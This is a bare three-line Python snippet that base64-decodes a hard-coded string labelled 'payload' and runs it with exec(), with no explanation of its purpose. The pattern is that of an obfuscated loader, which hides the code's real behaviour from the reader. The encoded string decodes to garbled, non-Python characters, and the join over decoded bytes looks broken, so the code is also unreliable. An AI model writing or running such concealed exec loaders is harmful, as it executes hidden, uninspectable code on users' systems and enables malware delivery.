import base64
payload = 'R1hfIl8iTgk2ImQiZCJHImQJMCIJCScJL182WEdOWAkvXzZYR1hYX08JXgknNgkvXzZYR1hYCS9fNlhHWF8JL182WEdYZAkvXzZYR1g2CS9fNlhHWAkJL182'
exec(''.join(x for x in base64.b64decode(payload)))
